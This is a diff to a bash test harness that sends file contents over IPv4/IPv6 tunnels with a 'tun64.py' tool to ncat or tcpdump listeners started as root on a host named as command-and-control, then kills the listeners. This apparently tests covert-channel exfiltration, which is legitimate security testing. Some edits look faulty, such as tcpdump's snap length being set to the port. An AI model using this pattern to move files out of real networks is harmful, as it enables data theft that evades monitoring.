@@ -91,15 +91,24 @@ netcat () {
 }
 tun64 () {
 
-	case $proto in
+	case $protocol in
 		t)
+		cmd="tcpdump -nnvvXSs $port -i tun64 | tee /tmp/tun64.log"
 		proto_key="T"
+		kill_cmd="pkill -9 tcpdump"
+		listen_cmd="nohup \"$cmd\" &"
 		;;
 		u)
+		cmd="ncat -6 -$protocol -w 3 -lp $port --output /tmp/tun64.log"
 		proto_key="U"
+		kill_cmd="pkill -9 ncat"
+		listen_cmd="screen -m -d \"$cmd\" "
 		;;
 		*)
+		cmd="ncat -6 -$protocol -w 3 -lp $port --output /tmp/tun64.log"
 		proto_key="U"
+		kill_cmd="pkill -9 ncat"
+		listen_cmd="screen -m -d \"$cmd\" "
 		;;
 	esac	
 
@@ -107,22 +116,21 @@ tun64 () {
 
 	for file in "${files[@]}"; do
 
-		cmd="ncat -$ver -$protocol -w 3 -lp $port --output /tmp/tun64.log"
-		echo "starting listener on port $port with protocol -$protocol on version $ver"
+		echo "starting listener on port $port with protocol -$protocol"
 		echo "command is:"
 		echo "$cmd"
-		ssh -p $cnc_ssh_port root@$cnc screen -m -d "$cmd" || echo fail
+		ssh -p $cnc_ssh_port root@$cnc $listen_cmd || echo fail
 		sleep 2
 
-		cmd="/root/tun64/tun64.py -i eth1 -vv --$mode -s4 192.168.11.11 -d4 $cnc_4 -d6 $cnc6 -dp $port -$proto_key -m \"\`cat $file\`\""
-		echo "attempting file transfer $file on port $port with protocol -$protocol on version $ver"
-		echo "command is:"
-		echo "$cmd"
-		ssh root@$host "$cmd" || echo fail
+		send_cmd="/root/tun64/tun64.py -i eth1 -v --$mode -s4 192.168.11.11 -d4 $cnc_4 -d6 $cnc_6 -dp $port -$proto_key -m \"\`cat $file\`\""
+		echo "attempting file transfer $file on port $port with protocol -$protocol"
+		echo "send command is:"
+		echo "$send_cmd"
+		ssh root@$host "$send_cmd" || echo fail
 		sleep 2
 
 		echo "attempting to kill listener"
-		ssh -p $cnc_ssh_port root@$cnc "pkill -9 ncat" || echo fail
+		ssh -p $cnc_ssh_port root@$cnc "$kill_cmd" || echo fail
 		sleep 2
 
 	done
@@ -152,7 +160,7 @@ run_netcat_test () {
 }
 run_tun64_test () {
 	for mode in "${tun64_modes[@]}"; do
-		echo "Initiating IP version $ver test"
+		echo "Initiating tunneling $mode test"
 		start_tcpdump_listener
 		tun64
 		kill_tcpdump_listener
@@ -160,7 +168,6 @@ run_tun64_test () {
 }
 
 # MAIN
-
 for protocol in "${proto[@]}"; do
 	echo "Initiating protocol $protocol test"
 	for port in "${ports[@]}"; do
